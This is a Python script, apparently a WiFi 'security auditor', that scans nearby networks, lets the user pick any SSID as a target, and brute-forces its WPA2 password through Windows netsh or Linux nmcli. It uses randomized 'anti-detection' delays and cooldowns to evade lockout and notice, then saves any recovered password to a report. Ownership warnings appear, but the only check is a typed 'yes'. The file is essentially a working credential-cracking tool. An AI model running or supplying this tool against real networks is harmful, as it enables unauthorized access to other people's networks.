#password_attack_simulator.py
"""
WiFi Credential Tester - Integrated Network Scanner Edition
For testing YOUR OWN network security only
No CSV required - Interactive password input
"""

import time
import random
import os
import subprocess
import sys
from datetime import datetime
import csv

# Import the NetworkScanner from your modules
try:
    from network_scanner import NetworkScanner
except ImportError:
    print("[-] Error: Cannot import NetworkScanner from modules.network_scanner")
    print("[-] Make sure network_scanner.py exists in modules/ directory")
    sys.exit(1)


class WiFiConnector:
    """
    Multi-platform WiFi connection tester with anti-bruteforce protection
    """
    
    def __init__(self, ssid, interface=None):
        self.ssid = ssid
        self.interface = interface
        self.attempt_count = 0
        self.success = False
        self.correct_password = None
        self.platform = self._detect_platform()
        
        # Anti-detection settings
        self.min_delay = 3
        self.max_delay = 10
        self.max_attempts_per_session = 10
        self.long_pause_duration = 300  # 5 minutes
        
    def _detect_platform(self):
        """Detect OS for appropriate commands"""
        if os.name == 'nt':
            return 'windows'
        elif os.name == 'posix':
            try:
                import platform
                if platform.system() == "Darwin":
                    return 'macos'
                return 'linux'
            except:
                return 'linux'
        return 'unknown'
    
    def _random_delay(self, attempt_num):
        """Calculate randomized delay with exponential backoff"""
        base_delay = self.min_delay
        
        if attempt_num > 0 and attempt_num % 5 == 0:
            base_delay = min(self.min_delay * 2, self.max_delay)
        
        jitter = random.uniform(-0.2, 0.4) * base_delay
        delay = base_delay + jitter
        return max(self.min_delay, delay)
    
    def _disconnect_current(self):
        """Disconnect from any current network"""
        try:
            if self.platform == 'windows':
                subprocess.run(['netsh', 'wlan', 'disconnect'], 
                             capture_output=True, timeout=5)
            else:
                interface = self.interface or 'wlan0'
                subprocess.run(['nmcli', 'device', 'disconnect', interface], 
                             capture_output=True, timeout=5)
            time.sleep(2)
        except:
            pass
    
    def _test_windows_connection(self, password):
        """Windows-specific connection test using netsh"""
        try:
            # Create temporary WiFi profile XML
            profile_name = f"temp_profile_{int(time.time())}"
            xml_content = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{profile_name}</name>
    <SSIDConfig>
        <SSID>
            <name>{self.ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
            
            temp_file = os.path.join(os.environ.get('TEMP', '/tmp'), f"{profile_name}.xml")
            with open(temp_file, 'w') as f:
                f.write(xml_content)
            
            # Add profile and connect
            subprocess.run(['netsh', 'wlan', 'add', 'profile', f'filename={temp_file}'], 
                         capture_output=True, timeout=5)
            
            result = subprocess.run(
                ['netsh', 'wlan', 'connect', f'name={profile_name}', f'ssid={self.ssid}'],
                capture_output=True, text=True, timeout=15
            )
            
            time.sleep(6)  # Wait for connection attempt
            
            # Check connection status
            status = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                  capture_output=True, text=True, timeout=5)
            
            # Cleanup
            subprocess.run(['netsh', 'wlan', 'delete', 'profile', f'name={profile_name}'], 
                         capture_output=True, timeout=3)
            if os.path.exists(temp_file):
                os.remove(temp_file)
            
            # Verify success
            if self.ssid in status.stdout and "connected" in status.stdout.lower():
                return True
            return False
            
        except Exception as e:
            print(f"[-] Windows connection error: {e}")
            return False
    
    def _test_linux_connection(self, password):
        """Linux-specific connection test using nmcli"""
        try:
            interface = self.interface or 'wlan0'
            
            # Attempt connection
            result = subprocess.run([
                'nmcli', 'device', 'wifi', 'connect',
                self.ssid, 'password', password, 'ifname', interface
            ], capture_output=True, text=True, timeout=30)
            
            if "successfully activated" in result.stdout.lower() or result.returncode == 0:
                return True
            
            # Disconnect if failed
            subprocess.run(['nmcli', 'connection', 'down', self.ssid], 
                         capture_output=True, timeout=5)
            return False
            
        except subprocess.TimeoutExpired:
            print("[-] Connection timeout")
            return False
        except Exception as e:
            print(f"[-] Linux connection error: {e}")
            return False
    
    def test_password(self, password):
        """Test single password"""
        self.attempt_count += 1
        print(f"\n[*] Attempt {self.attempt_count}/{self.total_passwords}: Testing '{password}'")
        
        if self.platform == 'windows':
            success = self._test_windows_connection(password)
        else:
            success = self._test_linux_connection(password)
        
        if success:
            print(f"[+] SUCCESS! Connected to '{self.ssid}' with password: {password}")
            self.success = True
            self.correct_password = password
            return True
        
        print(f"[-] Failed")
        if not self.success:
            self._disconnect_current()
        return False
    
    def test_passwords(self, passwords):
        """Test multiple passwords with anti-bruteforce delays"""
        self.total_passwords = len(passwords)
        
        print(f"\n{'='*60}")
        print(f"WiFi Password Testing Module")
        print(f"{'='*60}")
        print(f"Target SSID: {self.ssid}")
        print(f"Platform: {self.platform.upper()}")
        print(f"Total passwords: {len(passwords)}")
        print(f"Anti-detection delays: ENABLED")
        print(f"{'='*60}\n")
        
        # Initial disconnect
        self._disconnect_current()
        start_time = time.time()
        session_attempts = 0
        
        for idx, password in enumerate(passwords):
            # Session limit check (prevent router lockout)
            if session_attempts >= self.max_attempts_per_session:
                print(f"\n[!] Session limit reached ({self.max_attempts_per_session})")
                print(f"[!] Cooling down for {self.long_pause_duration} seconds...")
                time.sleep(self.long_pause_duration)
                session_attempts = 0
            
            # Apply randomized delay (except first attempt)
            if self.attempt_count > 0:
                delay = self._random_delay(self.attempt_count)
                print(f"[*] Anti-detection delay: {delay:.1f}s")
                time.sleep(delay)
            
            # Test the password
            if self.test_password(password):
                elapsed = time.time() - start_time
                print(f"\n[+] Connected in {self.attempt_count} attempts ({elapsed:.1f} seconds)")
                return {
                    "success": True,
                    "password": password,
                    "attempts": self.attempt_count,
                    "time_seconds": elapsed
                }
            
            session_attempts += 1
        
        # All passwords tested
        elapsed = time.time() - start_time
        print(f"\n[-] Exhausted all {len(passwords)} passwords")
        print(f"[-] Time elapsed: {elapsed:.1f} seconds")
        
        return {
            "success": False,
            "password": None,
            "attempts": self.attempt_count,
            "time_seconds": elapsed
        }


def get_passwords_interactive():
    """Get passwords from user or CSV file"""
    passwords = []

    print("\n[?] Password input method:")
    print("    1. Type passwords separated by commas")
    print("    2. Enter one by one (type 'done' to finish)")
    print("    3. Use CSV file (password.csv)")

    choice = input("\nSelect option (1-3): ").strip()

    if choice == '1':
        pwd_line = input("Enter passwords (comma-separated): ").strip()
        passwords = [p.strip() for p in pwd_line.split(',') if p.strip()]

    elif choice == '2':
        print("Enter passwords one per line (type 'done' to finish):")
        while True:
            pwd = input("> ").strip()
            if pwd.lower() == 'done':
                break
            if pwd:
                passwords.append(pwd)

    elif choice == '3':
        csv_file = "passwords.csv"

        if not os.path.exists(csv_file):
            print(f"[-] File not found: {csv_file}")
            return []

        try:
            with open(csv_file, newline='', encoding="utf-8") as f:
                reader = csv.DictReader(f)

                if "password" not in reader.fieldnames:
                    print("[-] CSV must contain a column named 'password'")
                    return []

                for row in reader:
                    pwd = row["password"].strip()
                    if pwd:
                        passwords.append(pwd)

            print(f"[+] Loaded {len(passwords)} passwords from {csv_file}")

        except Exception as e:
            print(f"[-] Error reading CSV: {e}")

    else:
        print("[-] Invalid option")

    return passwords



def main():
    """Main execution flow"""
    print("""
╔══════════════════════════════════════════════════════════════╗
║     WiFi Security Auditor - Network Scan + Brute Force      ║
║  ⚠️  WARNING: ONLY TEST NETWORKS YOU OWN! ⚠️                 ║
║  Unauthorized access to computer networks is a crime.        ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Step 1: Scan available networks
    print("[*] Initializing Network Scanner...")
    scanner = NetworkScanner()
    
    try:
        networks = scanner.scan()
    except Exception as e:
        print(f"[-] Scan failed: {e}")
        return
    
    if not networks:
        print("[-] No WiFi networks found. Check your wireless adapter.")
        return
    
    # Display available networks
    print(f"\n[+] Available Networks ({len(networks)} found):")
    print("-" * 60)
    print(f"{'#':<3} {'SSID':<25} {'Encryption':<12} {'Signal':<8}")
    print("-" * 60)
    
    for i, net in enumerate(networks, 1):
        ssid = net.get('ssid', 'Unknown')[:24]
        enc = net.get('encryption', 'Unknown')
        # Get best signal from BSSIDs
        bssids = net.get('bssids', [])
        signal = max([ap.get('signal', 0) for ap in bssids]) if bssids else 0
        print(f"{i:<3} {ssid:<25} {enc:<12} {signal}%")
    
    # Step 2: Select target
    while True:
        choice = input("\n[?] Select target (number or type SSID): ").strip()
        
        target = None
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(networks):
                target = networks[idx]['ssid']
        else:
            # Verify SSID exists in scan results
            for net in networks:
                if net['ssid'] == choice:
                    target = choice
                    break
        
        if target:
            break
        print("[-] Invalid selection. Choose from the list above.")
    
    print(f"\n[*] Target: '{target}'")
    
    # Step 3: Legal confirmation
    legal = input(f"\n[!] LEGAL NOTICE: Do you own '{target}' or have explicit permission to test it? (yes/no): ").strip().lower()
    if legal != 'yes':
        print("[!] Aborted. Only test networks you own or have permission to test.")
        return
    
    # Step 4: Get passwords (NO CSV)
    passwords = get_passwords_interactive()
    
    if not passwords:
        print("[-] No passwords to test.")
        return
    
    print(f"\n[*] Ready to test {len(passwords)} password(s)")
    confirm = input("[?] Begin testing with anti-detection delays? (yes/no): ").strip().lower()
    
    if confirm != 'yes':
        print("[!] Aborted by user.")
        return
    
    # Step 5: Execute test
    connector = WiFiConnector(target)
    result = connector.test_passwords(passwords)
    
    # Step 6: Optional save results (TXT only, no CSV)
    if input("\n[?] Save results to text file? (y/n): ").strip().lower() == 'y':
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_ssid = target.replace(" ", "_").replace("/", "_")
        filename = f"wifi_test_{safe_ssid}_{timestamp}.txt"
        
        with open(filename, 'w') as f:
            f.write(f"WiFi Security Test Report\n")
            f.write(f"{'='*50}\n")
            f.write(f"Date: {timestamp}\n")
            f.write(f"Target SSID: {target}\n")
            f.write(f"Success: {result['success']}\n")
            f.write(f"Attempts: {result['attempts']}\n")
            f.write(f"Duration: {result['time_seconds']:.2f}s\n")
            if result['success']:
                f.write(f"Valid Password: {result['password']}\n")
            f.write(f"{'='*50}\n")
        
        print(f"[+] Report saved: {filename}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)